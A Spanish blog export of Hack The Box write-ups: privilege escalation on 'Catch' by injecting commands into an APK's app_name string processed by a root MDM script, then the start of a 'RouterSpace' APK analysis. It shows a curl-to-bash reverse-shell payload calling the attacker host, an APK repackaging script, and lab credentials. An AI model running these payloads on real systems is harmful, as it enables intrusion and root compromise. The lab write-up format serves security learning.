PID=380039 | /bin/bash /opt/mdm/verify.sh 2022/04/20 01:34:01 CMD: UID=0 PID=380041 | jarsigner -verify /root/mdm/apk_bin/057b94c0323145cddea8fc14.apk El script verifica la firma, version de compilación y nombre de la app, de cada archivo .apk en /opt/mdm/apk_bin/.\nverify.sh\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 #!/bin/bash ################### # Signature Check # ################### sig_check() { jarsigner -verify \u0026#34;$1/$2\u0026#34; 2\u0026gt;/dev/null \u0026gt;/dev/null if [[ $? -eq 0 ]]; then echo \u0026#39;[+] Signature Check Passed\u0026#39; else echo \u0026#39;[!] Signature Check Failed. Invalid Certificate.\u0026#39; cleanup exit fi } ####################### # Compatibility Check # ####################### comp_check() { apktool d -s \u0026#34;$1/$2\u0026#34; -o $3 2\u0026gt;/dev/null \u0026gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 \u0026#34;(?\u0026lt;=compileSdkVersion=\\\u0026#34;)[^\\\u0026#34;]+\u0026#34; \u0026#34;$PROCESS_BIN/AndroidManifest.xml\u0026#34;) if [ -z \u0026#34;$COMPILE_SDK_VER\u0026#34; ]; then echo \u0026#39;[!] Failed to find target SDK version.\u0026#39; cleanup exit else if [ $COMPILE_SDK_VER -lt 18 ]; then echo \u0026#34;[!] APK Doesn\u0026#39;t meet the requirements\u0026#34; cleanup exit fi fi } #################### # Basic App Checks # #################### app_check() { APP_NAME=$(grep -oPm1 \u0026#34;(?\u0026lt;=\u0026lt;string name=\\\u0026#34;app_name\\\u0026#34;\u0026gt;)[^\u0026lt;]+\u0026#34; \u0026#34;$1/res/values/strings.xml\u0026#34;) echo $APP_NAME if [[ $APP_NAME == *\u0026#34;Catch\u0026#34;* ]]; then echo -n $APP_NAME|xargs -I {} sh -c \u0026#39;mkdir {}\u0026#39; mv \u0026#34;$3/$APK_NAME\u0026#34; \u0026#34;$2/$APP_NAME/$4\u0026#34; else echo \u0026#34;[!] App doesn\u0026#39;t belong to Catch Global\u0026#34; cleanup exit fi } ########### # Cleanup # ########### cleanup() { rm -rf $PROCESS_BIN;rm -rf \u0026#34;$DROPBOX/*\u0026#34; \u0026#34;$IN_FOLDER/*\u0026#34;;rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh) } ################### # MDM CheckerV1.0 # ################### DROPBOX=/opt/mdm/apk_bin IN_FOLDER=/root/mdm/apk_bin OUT_FOLDER=/root/mdm/certified_apps PROCESS_BIN=/root/mdm/process_bin for IN_APK_NAME in $DROPBOX/*.apk;do OUT_APK_NAME=\u0026#34;$(echo ${IN_APK_NAME##*/} | cut -d \u0026#39;.\u0026#39; -f1)_verified.apk\u0026#34; APK_NAME=\u0026#34;$(openssl rand -hex 12).apk\u0026#34; if [[ -L \u0026#34;$IN_APK_NAME\u0026#34; ]]; then exit else mv \u0026#34;$IN_APK_NAME\u0026#34; \u0026#34;$IN_FOLDER/$APK_NAME\u0026#34; fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME done cleanup Command Injection Tras analizar el script encontramos que es posible realizar \u0026lsquo;Command Injection\u0026rsquo; en la función app_check(). Inicialmente se obtiene el valor de la string app_name, verifica que este tenga el valor *Catch*, en tal caso utiliza app_name para crear un directorio, en este ultimo paso es posible inyectar un comando modificando el valor app_name en strings.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 app_check() { APP_NAME=$(grep -oPm1 \u0026#34;(?\u0026lt;=\u0026lt;string name=\\\u0026#34;app_name\\\u0026#34;\u0026gt;)[^\u0026lt;]+\u0026#34; \u0026#34;$1/res/values/strings.xml\u0026#34;) echo $APP_NAME if [[ $APP_NAME == *\u0026#34;Catch\u0026#34;* ]]; then echo -n $APP_NAME|xargs -I {} sh -c \u0026#39;mkdir {}\u0026#39; # \u0026lt;----- mv \u0026#34;$3/$APK_NAME\u0026#34; \u0026#34;$2/$APP_NAME/$4\u0026#34; else echo \u0026#34;[!] App doesn\u0026#39;t belong to Catch Global\u0026#34; cleanup exit fi } Craft - APK Para Injectar Comandos es necesario decompilar, modificar y compilar un apk, para ello utilizamos el apk que inicialmente encontramos: catchv1.0.apk. Creamos un script que nos permite crear el apk y enviar este al directorio de la máquina.\nInicialmente se instalan las herramientas necesarias: zipalign, apktool jarsigner. Aunque alguna de estas ya viene por defecto en Kali. Se decompila el apk en este caso utilizamos catchv1.0.apk. Se modifica el archivo strings.xml. Con el archivo strings.xml modificado el script:\nCompila el apk con el archivo strings.xml modificado. Genera una key para firmar el apk compilado. Se eliminan los apks anteriormente generados, ya que es necesario realizar distintas pruebas. Se compila el nuevo apk, se firma y optimiza para finalmente ser enviado a la maquina. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #!/bin/bash # sudo apt-get install default-jdk zipalign -y # apktool: https://bitbucket.org/iBotPeaches/apktool/downloads/ # Decompile # java -jar apktool_2.6.1.jar d catchv1.0.apk # Create key if [[ -f key.keystore ]]; then echo \u0026#34;\u0026#34; else keytool -genkey -V -keystore key.keystore -alias Catch -storepass \u0026#39;123456\u0026#39; -keypass \u0026#39;123456\u0026#39; -keyalg RSA -keysize 2048 -validity 10000 -dname \u0026#39;CN=Catch, OU=Catch, O=Catch, L=Catch, ST=Catch, C=CA\u0026#39; fi # Delete previous apk generated if [[ -f catch_comp.apk \u0026amp;\u0026amp; -f catch_signed.apk ]]; then rm catch_comp.apk catch_signed.apk fi # Compile apk from modified apk folder: catchv1.0/ java -jar apktool_2.6.1.jar b catchv1.0 -o catch_comp.apk # Sign compiled apk with key jarsigner -sigalg SHA1withRSA -storepass \u0026#39;123456\u0026#39; -digestalg SHA1 -keystore key.keystore catch_comp.apk Catch #jarsigner -verify -certs catch_comp.apk # Optimization zipalign -v 4 catch_comp.apk catch_signed.apk # Copy apk to catch folder echo \u0026#34;Copying apk to Catch.htb ...\u0026#34; sshpass -p \u0026#39;s2#4Fg0_%3!\u0026#39; scp catch_signed.apk will@catch.htb:/opt/mdm/apk_bin/ echo \u0026#34;Check apk in apk_bin/\u0026#34; sshpass -p \u0026#39;s2#4Fg0_%3!\u0026#39; ssh -t will@catch.htb \u0026#39;ls -lah /opt/mdm/apk_bin/\u0026#39; echo \u0026#34;\u0026#34; Teniendo nuestro script listo realizamos la modificacion al archivo strings.xml, enviamos un pequeño ping a nuestra máquina.\n1 \u0026lt;string name=\u0026#34;app_name\u0026#34;\u0026gt;Catch|ping -c 3 10.10.14.207\u0026lt;/string\u0026gt; Ejecutamos el script vemos que no hay ningun error y que el archivo está en la carpeta apk_bin/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 π ~/htb/catch/app ❯ ./modify.sh Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Destination directory (/home/kali/htb/catch/app/catchv1.0) already exists. Use -f switch if you want to overwrite it. Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.6.1 I: Checking whether sources has changed... I: Checking whether resources has changed... I: Building apk file... I: Copying unknown files/dir... I: Built apk... Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true jar signed. Warning: The signer\u0026#39;s certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. Verifying alignment of catch_signed.apk (4)... 50 META-INF/MANIFEST.MF (OK - compressed) 20453 META-INF/CATCH.SF (OK - compressed) [.. snip ..] 418036 resources.arsc (OK) 1115381 classes.dex (OK - compressed) Verification successful Copying apk to Catch.htb ... Check apk in apk_bin/ total 2.7M drwxrwx--x+ 2 root root 4.0K Apr 20 03:37 . drwxr-x--x+ 3 root root 4.0K Mar 3 14:23 .. -rw-r--r-- 1 will will 2.7M Apr 20 03:37 catch_signed.apk Connection to catch.htb closed. π ~/htb/catch/app ❯ Después de unos segundos obtuvimos un ping desde la máquina.\n1 2 3 4 5 6 7 π ~/htb/catch ❯ sudo tcpdump -i tun1 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 23:37:14.007382 IP catch.htb \u0026gt; 10.10.14.207: ICMP echo request, id 4, seq 1, length 64 23:37:14.007398 IP 10.10.14.207 \u0026gt; catch.htb: ICMP echo reply, id 4, seq 1, length 64 23:37:15.008580 IP catch.htb \u0026gt; 10.10.14.207: ICMP echo request, id 4, seq 2, length 64 23:37:15.008619 IP 10.10.14.207 \u0026gt; catch.htb: ICMP echo reply, id 4, seq 2, length 64 Ejecutamos shells, modificamos el archivo strings.xml de tal forma que nos ejecute una shell inversa.\n1 \u0026lt;string name=\u0026#34;app_name\u0026#34;\u0026gt;Catch|curl 10.10.14.207/10.10.14.207:1338|bash\u0026lt;/string\u0026gt; Luego de ejecutar el script logramos obtener una shell como root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/catch ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from catch.htb [10.10.11.150] 37512 can\u0026#39;t access tty; job control turned off # which python # which python3 /usr/bin/python3 # python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@catch:~# whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /root root@catch:~# ls Catch index.html lets-chat mdm reset.sh root.txt run.sh root@catch:~# cat root.txt 57edb41f6f12cae3f62e1392e71e79e1 root@catch:~# Anexo - CVE CVE-2021-39172 La explotación del CVE-2021-39172 RCE parece no funcionar por varios motivos, uno de ellos es un cronjob (reset.sh) el cual reemplaza el archivo .env de cada contenedor, lo que hace que la configuración cambie a su estado inicial.\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@catch:~# crontab -l */3 * * * * /root/reset.sh @reboot /root/run.sh @reboot cd /root/lets-chat;/usr/bin/npm start * * * * * /opt/mdm/verify.sh * * * * * rm -rf /root/mdm/certified_apps/* root@catch:~# cat /root/reset.sh #!/bin/bash for i in `docker ps -a -q` do docker cp /root/.env $i:/var/www/html/Cachet/.env done root@catch:~# Aún si la configuración aparece por un corto periodo de tiempo en el archivo, el servidor redis no recibe ninguna petición/conexión desde la máquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 root@85be90327d1d:/var/www/html/Cachet# cat .env [.. snip ..] CACHE_DRIVER=file \u0026lt;--- REDIS_HOST=10.10.14.207 \u0026lt;--- REDIS_DATABASE=0 \u0026lt;--- REDIS_PORT=6379 \u0026lt;--- SESSION_DRIVER=redis \u0026lt;--- SESSION_DRIVER=database QUEUE_DRIVER=null CACHET_BEACON=true CACHET_EMOJI=false CACHET_AUTO_TWITTER=true MAIL_DRIVER=smtp MAIL_HOST= MAIL_PORT=null MAIL_USERNAME= MAIL_PASSWORD= MAIL_ADDRESS=notify@10.129.136.74 MAIL_NAME=null MAIL_ENCRYPTION=tls REDIS_HOST=null REDIS_DATABASE=null REDIS_PORT=null [.. snip ..] Unicamente se muestra un codigo de respuesta 500.\nCVE-2021-39174 En el post se menciona que no hay ningun tipo de validación y al enviar un valor con saltos de lineas se crearían nuevas variables de configuración las cuales reemplazarian a las siguientes. Sin embargo parece ser posible editar las variables existentes utilizando el formulario de configuración, sin utilizar los saltos de linea.\n1 2 3 4 5 6 # Ex: config[cache_driver]: \u0026#39;file\u0026#39;, config[redis_host]: redis-server.htb, config[redis_database]: \u0026#39;0\u0026#39;, config[redis_port]: 6969, config[session_driver]: \u0026#39;redis\u0026#39;, En este caso vemos los cambios reflejados en el archivo de configuración.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 root@85be90327d1d:/var/www/html/Cachet# cat .env APP_ENV=production APP_DEBUG=false APP_URL=http://localhost APP_TIMEZONE=UTC APP_KEY=base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA= DEBUGBAR_ENABLED=false DB_DRIVER=mysql DB_HOST=localhost DB_UNIX_SOCKET=null DB_DATABASE=cachet DB_USERNAME=will DB_PASSWORD=s2#4Fg0_%3! DB_PORT=null DB_PREFIX=null CACHE_DRIVER=file \u0026lt;----- SESSION_DRIVER=redis \u0026lt;----- QUEUE_DRIVER=null CACHET_BEACON=true CACHET_EMOJI=false CACHET_AUTO_TWITTER=true MAIL_DRIVER=smtp MAIL_HOST= MAIL_PORT=null MAIL_USERNAME= MAIL_PASSWORD= MAIL_ADDRESS=notify@10.129.136.74 MAIL_NAME=null MAIL_ENCRYPTION=tls REDIS_HOST=redis-server.htb \u0026lt;----- REDIS_DATABASE=0 \u0026lt;----- REDIS_PORT=6969 \u0026lt;----- GITHUB_TOKEN=null NEXMO_KEY=null NEXMO_SECRET=null NEXMO_SMS_FROM=Cachet TRUSTED_PROXIES= root@85be90327d1d:/var/www/html/Cachet# ","description":"Cachet presenta un APK que contiene Tokens de autenticación lo que nos permitió acceder a Lets Chat, en este último encontramos credenciales. Una vulnerabilidad en Cachet permite filtrar las variables de configuración, tras la explotación obtuvimos nuevas credenciales y acceso por SSH. Finalmente escalamos privilegios realizando Command Injection en el nombre de una aplicación de un APK.","id":21,"section":"posts","tags":["gitea","lets-chat","cachet","CVE-2021-39174","CVE-2021-39172","apk","android","jadx","apktool","jarsigner","zipalign"],"title":"Hack The Box - Catch","uri":"https://sckull.github.io/posts/catch/"},{"content":"\rRouterSpace presenta una aplicación android la cual nos permitió descubrir una vulnerabilidad Command Injection en la API utilizada por esta lo que nos dio acceso a la máquina. Escalamos privilegios tras identificar la version de sudo y el CVE-2021-3156.\nNombre RouterSpace OS Linux Puntos 20 Dificultad Facil IP 10.10.11.148 Maker h4rithd\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.4, 4.3, 6.2, 3.8, 5.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 7, 6, 4, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 # Nmap 7.91 scan initiated Sat Feb 26 23:42:44 2022 as: nmap -sS -sVC -p- -oN nmap_scan 10.129.142.119 Nmap scan report for 10.129.142.119 (10.129.142.119) Host is up (0.11s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-43104 | Content-Type: text/html; charset=utf-8 | Content-Length: 71 | ETag: W/\u0026#34;47-HnqVeZEDd5RFdLo0yVWG8nQgfnM\u0026#34; | Date: Sat, 26 Feb 2022 23:49:51 GMT | Connection: close | Suspicious activity detected !!! {RequestID: M i2T e BPYFjg } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-75328 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\u0026#34;652c-17d476c9285\u0026#34; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Sat, 26 Feb 2022 23:49:48 GMT | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;zxx\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/magnific-popup.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/themify-icons.css\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-41118 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\u0026#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\u0026#34; | Date: Sat, 26 Feb 2022 23:49:49 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close |_http-title: RouterSpace |_http-trane-info: Problem with XML parsing of /evox/about [.. snip ..] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 26 23:50:13 2022 -- 1 IP address (1 host up) scanned in 449.69 seconds Web Site Realizando una solicitud con curl vemos en los Headers \u0026ldquo;RouterSpace\u0026rdquo;, al investigar esta \u0026ldquo;tecnologia\u0026rdquo; no encontramos nada relacionado.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/routerspace ❯ curl -sI http://10.129.142.119/ HTTP/1.1 200 OK X-Powered-By: RouterSpace X-Cdn: RouterSpace-95320 Accept-Ranges: bytes Cache-Control: public, max-age=0 Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT ETag: W/\u0026#34;652c-17d476c9285\u0026#34; Content-Type: text/html; charset=UTF-8 Content-Length: 25900 Date: Sat, 26 Feb 2022 23:55:41 GMT Connection: keep-alive El sitio web presenta una aplicación para realizar una conexión con routers, se muestra un boton a la dirección de descarga de la app.\nFull Web Site\rAndroid APP Analisis Estático Apktool Iniciamos descargando la aplicación RouterSpace.apk, y con apktool decompilar el apk y obtener los recursos de la aplicación.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ routerspace apktool d RouterSpace.apk I: Using Apktool 2.4.0-dirty on RouterSpace.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /home/sckull/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... ➜ routerspace l -lah RouterSpace total 44K drwxrwxr-x 9 sckull sckull 4.0K mar 2 20:35 . drwxrwxr-x 3 sckull sckull 4.0K mar 2 20:35 .. -rw-rw-r-- 1 sckull sckull 1.2K mar 2 20:35 AndroidManifest.xml -rw-rw-r-- 1 sckull sckull 3.7K mar 2 20:35 apktool.yml drwxrwxr-x 3 sckull sckull 4.0K mar 2 20:35 assets drwxrwxr-x 8 sckull sckull 4.0K mar 2 20:35 kotlin drwxrwxr-x 6 sckull sckull 4.0K mar 2 20:35 lib drwxrwxr-x 3 sckull sckull 4.0K mar 2 20:35 original drwxrwxr-x 141 sckull sckull 4.0K mar 2 20:35 res drwxrwxr-x 11 sckull sckull 4.0K mar 2 20:35 smali drwxrwxr-x 3 sckull sckull 4.0K mar 2 20:35 unknown ➜ routerspace Observamos el archivo AndroidManifest.xml, el cual puede contener información de paquetes, elementos, servicios, activities, etc. Se muestra en este caso:\nEl nombre del paquete de la aplicación \u0026ldquo;package=\u0026ldquo;com.routerspace\u0026rdquo;\u0026rdquo;. El Activity \u0026ldquo;android:name=\u0026ldquo;com.routerspace.MainActivity\u0026rdquo;\u0026rdquo;. Permisos, el único permiso que se muestra: \u0026ldquo;android:name=\u0026ldquo;android.permission.INTERNET\u0026rdquo;\u0026rdquo;. 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;manifest xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:compileSdkVersion=\u0026#34;30\u0026#34; android:compileSdkVersionCodename=\u0026#34;11\u0026#34; package=\u0026#34;com.routerspace\u0026#34; platformBuildVersionCode=\u0026#34;30\u0026#34; platformBuildVersionName=\u0026#34;11\u0026#34;\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34;/\u0026gt; \u0026lt;application android:allowBackup=\u0026#34;false\u0026#34; android:appComponentFactory=\u0026#34;androidx.core.app.CoreComponentFactory\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:name=\u0026#34;com.routerspace.MainApplication\u0026#34; android:roundIcon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:theme=\u0026#34;@style/AppTheme\u0026#34;\u0026gt; \u0026lt;activity android:configChanges=\u0026#34;keyboard|keyboardHidden|orientation|screenSize|uiMode\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:name=\u0026#34;com.routerspace.MainActivity\u0026#34; android:windowSoftInputMode=\u0026#34;adjustResize\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;/application\u0026gt; \u0026lt;/manifest\u0026gt; Si analizamos los archivos vemos que unicamente se muestran archivos .smali que contienen el \u0026ldquo;codigo fuente\u0026rdquo; de la aplicación, pero existe otra herramienta que nos permite leer de manera más \u0026rsquo;entendible\u0026rsquo; el código.\nJadx Utilizamos jadx que permite generar código java a partir de un .apk o archivo .dex. Ejecutamos jadx-gui y nos presenta los diferentes recursos de la aplicación. Entre ellos encontramos el paquete \u0026ldquo;principal\u0026rdquo; de la aplicación. Sin embargo no encontramos código que nos indicara el funcionamiento y/o comportamiento de la aplicación, aunque se muestran distintas \u0026rsquo;librerias\u0026rsquo; de react.\nBasados en lo último, intentamos analizar el codigo de la app como si de React Native se tratase, realizamos lo que se presenta en el siguiente post.\n1 2 3 4 5 6 7 8 9 ➜ assets l total 1.1M drwxrwxr-x 3 sckull sckull 4.0K mar 2 20:35 . drwxrwxr-x 9 sckull sckull 4.0K mar 2 20:35 .. drwxrwxr-x 2 sckull sckull 4.0K mar 2 20:35 fonts -rw-rw-r-- 1 sckull sckull 1.1M mar 2 20:35 index.android.bundle ➜ assets touch index.html ➜ assets echo \u0026#39;\u0026lt;script src=\u0026#34;./index.android.bundle\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; \u0026gt; index.html ➜ assets Aún con ello no logramos obtener información completa, unicamente vemos un array que contiene información de manera desordenada.\nAunque podemos decir que realiza algun tipo de solicitud POST con información JSON a una API, al dominio y ruta routerspace.htb/api/v4/, aunque la ruta completa es desconocida. En el caso de tener el fichero index.android.bundle.map podríamos tener el código mucho más entendible.\n1 var _0x379495 = [\u0026#39;EwCVL\u0026#39;, \u0026#39;ugPGw\u0026#39;, \u0026#39;Router\\x20is\\x20\u0026#39;, \u0026#39;-Bold\u0026#39;, \u0026#39;data\u0026#39;, \u0026#39;30158095HXLvSs\u0026#39;, \u0026#39;post\u0026#39;, \u0026#39;eAgent\u0026#39;, \u0026#39;http://rou\u0026#39;, \u0026#39;10BrHGoD\u0026#39;, \u0026#39;gray\u0026#39;, \u0026#39;80%\u0026#39;, \u0026#39;applicatio\u0026#39;, \u0026#39;white\u0026#39;, \u0026#39;ck\\x20your\\x20in\u0026#39;, \u0026#39;ternet\\x20con\u0026#39;, \u0026#39;tb/api/v4/\u0026#39;, \u0026#39;Please\\x20pro\u0026#39;, \u0026#39;Image\u0026#39;, \u0026#39;XvhFJ\u0026#39;, \u0026#39;2111347AIyazK\u0026#39;, \u0026#39;v/check/de\u0026#39;, \u0026#39;vide\\x20an\\x20IP\u0026#39;, \u0026#39;working\\x20fi\u0026#39;, \u0026#39;DKyDg\u0026#39;, \u0026#39;YnNsf\u0026#39;, \u0026#39;tzoEq\u0026#39;, \u0026#39;EKNxl\u0026#39;, \u0026#39;the\\x20server\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;ne!.\u0026#39;, \u0026#39;NunitoSans\u0026#39;, \u0026#39;OgZoU\u0026#39;, \u0026#39;TouchableO\u0026#39;, \u0026#39;32457sfggQZ\u0026#39;, \u0026#39;nection.\u0026#39;, \u0026#39;[\\x20RESPOND\\x20\u0026#39;, \u0026#39;center\u0026#39;, \u0026#39;createElem\u0026#39;, \u0026#39;__esModule\u0026#39;, \u0026#39;per\u0026#39;, \u0026#39;mGNnc\u0026#39;, \u0026#39;then\u0026#39;, \u0026#39;catch\u0026#39;, \u0026#39;contain\u0026#39;, \u0026#39;uAiCt\u0026#39;, \u0026#39;bottom\u0026#39;, \u0026#39;42740dmWhFN\u0026#39;, \u0026#39;Text\u0026#39;, \u0026#39;ButtonWrap\u0026#39;, \u0026#39;OLDvc\u0026#39;, \u0026#39;Sorry\\x20!\u0026#39;, \u0026#39;terspace.h\u0026#39;, \u0026#39;n/json\u0026#39;, \u0026#39;StyleSheet\u0026#39;, \u0026#39;/router/de\u0026#39;, \u0026#39;darkgray\u0026#39;, \u0026#39;JHvFI\u0026#39;, \u0026#39;transparen\u0026#39;, \u0026#39;UWIVj\u0026#39;, \u0026#39;Please\\x20che\u0026#39;, \u0026#39;SZqEq\u0026#39;, \u0026#39;default\u0026#39;, \u0026#39;HrHYj\u0026#39;, \u0026#39;Hey\\x20!\u0026#39;, \u0026#39;monitoring\u0026#39;, \u0026#39;StatusBar\u0026#39;, \u0026#39;error\u0026#39;, \u0026#39;1013605BwxVJG\u0026#39;, \u0026#39;[\\x20DEBUG\\x20]\\x20\u0026#39;, \u0026#39;defineProp\u0026#39;, \u0026#39;gUnlE\u0026#39;, \u0026#39;Unable\\x20to\\x20\u0026#39;, \u0026#39;25%\u0026#39;, \u0026#39;pacity\u0026#39;, \u0026#39;ButtonText\u0026#39;, \u0026#39;gKQYs\u0026#39;, \u0026#39;1006000MsdmAT\u0026#39;, \u0026#39;handleSubm\u0026#39;, \u0026#39;PpdRl\u0026#39;, \u0026#39;shxxV\u0026#39;, \u0026#39;ent\u0026#39;, \u0026#39;View\u0026#39;, \u0026#39;erty\u0026#39;, \u0026#39;show\u0026#39;, \u0026#39;Formik\u0026#39;, \u0026#39;Check\\x20Stat\u0026#39;, \u0026#39;0.0.0.0\u0026#39;, \u0026#39;128BJBUSC\u0026#39;, \u0026#39;6BAxhAU\u0026#39;, 